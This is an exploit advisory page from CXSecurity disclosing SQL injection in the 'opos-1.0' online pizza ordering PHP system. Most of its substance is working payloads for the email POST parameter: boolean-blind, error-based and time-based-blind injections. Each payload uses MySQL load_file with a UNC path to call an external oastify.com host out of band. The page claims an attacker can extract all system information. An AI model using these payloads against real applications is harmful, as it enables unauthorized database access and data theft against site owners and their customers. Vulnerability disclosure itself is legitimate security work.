---
title: opos-1.0 Multiple SQLi
url: https://cxsecurity.com/issue/WLB-2024060017
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-08
fetch_date: 2025-10-06T16:54:35.184266
---

# opos-1.0 Multiple SQLi

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **opos-1.0 Multiple SQLi** **2024.06.07**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

## Titles: opos-1.0 Multiple SQLi
## Author: nu11secur1ty
## Date: 06/07/2024
## Vendor: https://github.com/oretnom23
## Software: https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html
## Reference: https://portswigger.net/web-security/sql-injection
## Description:
The email parameter appears to be vulnerable to SQL injection attacks. The payload '+(select load\_file('\\\\prk350bzcbgiu65bqx3boktqahga43suvin5ht6.oastify.com\\ius'))+' was submitted in the email parameter. This payload injects a SQL sub-query that calls MySQL's load\_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed. The attacker can get all information from the system by using this vulnerability!
STATUS: HIGH- Vulnerability
[+]Exploits:
- SQLi Multiple:
```mysql
---
Parameter: email (POST)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: first\_name=zKwBGOrp&last\_name=zKwBGOrp&mobile=zKwBGOrp&address=zKwBGOrp&email=zKwBGOrp@burpcollaborator.net'+(select load\_file('\\\\prk350bzcbgiu65bqx3boktqahga43suvin5ht6.oastify.com\\ius'))+'' AND 9762=9762 AND 'REtq'='REtq&password=e7E!x2k!U6
Type: error-based
Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
Payload: first\_name=zKwBGOrp&last\_name=zKwBGOrp&mobile=zKwBGOrp&address=zKwBGOrp&email=zKwBGOrp@burpcollaborator.net'+(select load\_file('\\\\prk350bzcbgiu65bqx3boktqahga43suvin5ht6.oastify.com\\ius'))+'' AND (SELECT 3595 FROM(SELECT COUNT(\*),CONCAT(0x7176766a71,(SELECT (ELT(3595=3595,1))),0x71716b7671,FLOOR(RAND(0)\*2))x FROM INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a) AND 'Gtza'='Gtza&password=e7E!x2k!U6
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: first\_name=zKwBGOrp&last\_name=zKwBGOrp&mobile=zKwBGOrp&address=zKwBGOrp&email=zKwBGOrp@burpcollaborator.net'+(select load\_file('\\\\prk350bzcbgiu65bqx3boktqahga43suvin5ht6.oastify.com\\ius'))+'' AND (SELECT 3908 FROM (SELECT(SLEEP(7)))ddOC) AND 'ECyu'='ECyu&password=e7E!x2k!U6
---
```
## Reproduce:
[href](https://www.patreon.com/posts/opos-1-0-sqli-105752878)
## Proof and Exploit:
[href](https://www.nu11secur1ty.com/2024/06/opos-10-multiple-sqli.html)
## Time spent:
00:19:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060017)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top